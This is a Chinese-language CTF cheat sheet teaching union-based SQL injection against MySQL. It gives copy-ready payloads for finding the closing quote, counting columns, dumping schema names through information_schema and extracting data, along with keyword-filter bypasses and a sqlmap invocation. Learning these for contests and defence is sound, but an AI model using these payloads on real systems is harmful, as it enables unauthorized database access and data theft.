### 第一部分：核心认知
-   **什么是SQL注入？** 
    相当于你在登录框输入密码时，偷偷把“查询命令”混进去。本来系统问的是“密码是多少？”，你却回答“密码是多少**都不重要，直接把数据全给我打印出来**”。

-   **SQL注入的本质就两步：**
    1.  **闭合（逃逸）**：把你输入的内容，补成一句完整的SQL命令（让系统以为你的话是命令的一部分）。
    2.  **注释（截断）**：把系统原本后面自带的尾巴（多余的单引号或括号）用`-- -`或`#`屏蔽掉，防止报错。

-   **三大题型判断（记住这张图）：**
    -   **有报错信息** → **报错注入**（最快，直接爆数据）。
    -   **无报错，但页面显示“对/错”** → **布尔盲注**（猜字符，猜对了显示A，错了显示B）。
    -   **啥变化都没有** → **时间盲注**（猜对了等3秒，猜错了立刻返回）。

### 第二部分：通用解题“五步杀手锏”（CTF必背）

无论遇到什么题，只要确定是联合查询注入（`union`没被过滤），就按这个流程走。**括号和引号可以变，但下面这些SQL单词是固定的。**

**第一步：找闭合（试探）**
在参数后面依次尝试：`'` 、`"` 、`)` 、`'))` 。 
**目的**：看页面报错，直到不报错，说明括号补平了。 
**必带后缀**：`-- -` 或 `#`（注释掉原SQL尾巴）。

**第二步：查列数（踩点）**
```sql
1' order by 3 -- -
1' order by 4 -- -
```
**作用**：猜当前表格有几列。数字从1开始往上加，直到报错为止。报错前的那个最大数字就是列数（比如`order by 3`对，`4`错，那就是**3列**）。

**第三步：查回显位（找出口）**
```sql
1' union select 1,2,3 -- -
```
**作用**：看页面上显示的数字是几（比如页面显示了`2`），就代表第**2**列能让你输出数据。下面所有查询，都把要查的内容放在这个位置。

**第四步：爆库名、表名、列名（查地图）**
将第三步的数字`2`替换为下面的语句（以3列为例）：

| 目标 | 替换第2列的Payload | 得到什么？ |
| :--- | :--- | :--- |
| **爆当前数据库名** | `database()` | 得到库名（比如 `ctf`） |
| **爆所有表名** | `group_concat(table_name) from information_schema.tables where table_schema=database()` | 得到该库下所有表名（如 `users,flag`） |
| **爆指定表的列名**（假设表名是`flag`） | `group_concat(column_name) from information_schema.columns where table_name='flag'` | 得到字段名（如 `id,flag`） |

**第五步：脱库（拿Flag）**
```sql
1' union select 1,group_concat(flag),3 from flag -- -
```
如果上一步查到表名叫`flag`，列名也叫`flag`，直接复制这句，**结束战斗**。

### 第三部分：新手必须死记硬背的“三大神器”

-   **神器1：`information_schema`** 
    把它想象成MySQL的**全国户口系统**。它存着所有库、所有表、所有列的名字。你没有上帝视角，只能通过查这个系统来知道目标叫什么名字。

-   **神器2：`group_concat()`** 
    把它想象成**“胶水”**。因为页面只能显示一行数据，而表里有几十行，用这个胶水把几十行粘成一行长长的字符串，一次性全显示出来。

-   **神器3：`database()` 和 `substr()`**
    -   `database()`：查看当前在哪个库。
    -   `substr(数据,1,1)`：截取字符串的第一个字（布尔盲注时一个字一个字猜）。

### 第四部分：CTF常见“拦路虎”及一键绕过（保命秘籍）

出题人经常屏蔽关键词，看到报错拦截不要慌，直接用下面三板斧：

| 被过滤的内容 | 最简单替代方案（新手直接复制用） |
| :--- | :--- |
| **空格被拦** | 用 `/**/`（注释符）代替空格。例：`union/**/select` |
| **`and` 或 `or` 被拦** | 用 `&&` 代替 `and`，用 &#124;&#124; 代替 `or`。例：`1' && 1=1 -- -` |
| **`=` 等号被拦** | 用 `like` 代替。例：`ascii(substr(flag,1,1)) like 100` |
| **逗号 `,` 被拦** | `substr(flag,1,1)` 改成 `substr(flag from 1 for 1)`。`limit 1,1` 改成 `limit 1 offset 1`。 |
| **`information_schema` 被拦** | 试试系统自带的备胎：`sys.schema_table_statistics` 或 `mysql.innodb_table_stats`。 |

### 第五部分：最终极解题

1.  **先跑SQLMap（自动化工具）**：CTF比赛中，如果允许，先用 `sqlmap -u "网址" --batch` 跑一遍。如果能出结果，直接交卷，节省时间。
2.  **手工必杀技**：如果工具跑不出，**请死死盯住“报错信息”**。90%的注入点，数据库会把表名、列名直接报出来，你只需要看报错内容就能拿Flag，根本不用写盲注脚本。
3.  **表名找不到怎么办？** 出题人最喜欢改表名。如果查 `information_schema` 发现表名叫 `this_is_flag`，记得把第四步中的 `'flag'` 换成 `'this_is_flag'`。**灵活应变比死记硬背更重要。**

**总结**：SQL注入就是**拼字符串**。只要搞懂了第一步怎么把单引号和括号拼进去，后面的`union select`、`information_schema`就是固定的八股文，复制粘贴就能得分。加油！💪
